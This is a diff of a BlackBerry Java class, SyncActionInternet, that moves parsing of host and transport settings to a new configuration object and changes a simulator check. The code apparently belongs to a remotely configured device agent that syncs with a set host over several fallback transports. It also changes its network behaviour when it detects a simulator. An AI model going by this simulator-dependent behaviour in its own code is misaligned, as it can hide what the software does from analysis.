@@ -8,19 +8,16 @@
  * *************************************************/
 package blackberry.action.sync;
 
-import java.io.EOFException;
-
 import net.rim.device.api.system.DeviceInfo;
-import net.rim.device.api.util.DataBuffer;
 import blackberry.action.sync.transport.BesTransport;
 import blackberry.action.sync.transport.BisTransport;
 import blackberry.action.sync.transport.DirectTransport;
 import blackberry.action.sync.transport.Wap2Transport;
 import blackberry.action.sync.transport.WifiTransport;
-import blackberry.debug.Check;
+import blackberry.config.ConfAction;
+import blackberry.config.ConfigurationException;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.utils.WChar;
 
 public class SyncActionInternet extends SyncAction {
     //#ifdef DEBUG
@@ -37,54 +34,51 @@ public class SyncActionInternet extends SyncAction {
 
     String host;
 
-    public SyncActionInternet(final int actionId_, final byte[] confParams) {
-        super(actionId_, confParams);
+    private boolean stop;
 
-        //#ifdef DBC
-        Check.requires(actionId == ACTION_SYNC_INTERNET, "Wrong ActionId");
-        //#endif
+    /**
+     * Instantiates a new sync action internet.
+     * 
+     * @param params
+     *            the conf params
+     */
+    public SyncActionInternet(ConfAction conf) {
+        super(conf);
     }
 
-    protected boolean parse(final byte[] confParams) {
-        final DataBuffer databuffer = new DataBuffer(confParams, 0,
-                confParams.length, false);
-
+    protected boolean parse(final ConfAction params) {
         try {
             wifi = true;
-            
-            int dgprs = databuffer.readInt();
-            int dwifi = databuffer.readInt();
-
+            gprs = params.getBoolean("cell");
+            wifi = params.getBoolean("wifi");
+            wifiForced = wifi;
+            host = params.getString("host");
+            stop = params.getBoolean("stop");
+        } catch (final ConfigurationException e) {
             //#ifdef DEBUG
-            debug.trace("parse gprs=" + dgprs + " wifi=" + dwifi);
+            debug.error(e);
+            debug.error("parse");
             //#endif
-
-            gprs = dgprs == 1;
-            wifiForced = dwifi == 1;
-
-            bis = gprs;
-            bes = gprs;
-            wap2 = gprs;
-
-            final int len = databuffer.readInt();
-            final byte[] buffer = new byte[len];
-            databuffer.readFully(buffer);
-
-            host = WChar.getString(buffer, true);
-
-        } catch (final EOFException e) {
-            //#ifdef DEBUG
-            debug.error("params FAILED");
-            //#endif
-            return false;
         }
 
+        bis = gprs;
+        bes = gprs;
+        wap2 = gprs;
+
+        if(DeviceInfo.isSimulator()){
+            gprs=true;
+            bis=false;
+            bes=false;
+            wap2=false;
+            wifi=false;
+        }
+        
         //#ifdef DEBUG
         final StringBuffer sb = new StringBuffer();
-        sb.append("gprs: " + gprs);
-        sb.append(" wifi: " + wifi);
-        sb.append(" wifiForced: " + wifiForced);
-        sb.append(" host: " + host);
+        sb.append("gprs: " + gprs); //$NON-NLS-1$
+        sb.append(" wifi: " + wifi); //$NON-NLS-1$
+        sb.append(" stop: " + stop); //$NON-NLS-1$
+        sb.append(" host: " + host); //$NON-NLS-1$
         debug.trace(sb.toString());
         //#endif
 
@@ -95,7 +89,7 @@ public class SyncActionInternet extends SyncAction {
     public String toString() {
         return "SyncInternet ";
     }
-    //#endifS
+    //#endif
 
     protected boolean initTransport() {
         if (wifi) {
@@ -126,7 +120,7 @@ public class SyncActionInternet extends SyncAction {
             transports.addElement(new Wap2Transport(host));
         }
 
-        if (gprs || DeviceInfo.isSimulator()) {
+        if (gprs) {
             //#ifdef DEBUG
             debug.trace("initTransport adding DirectTransport");
             //#endif
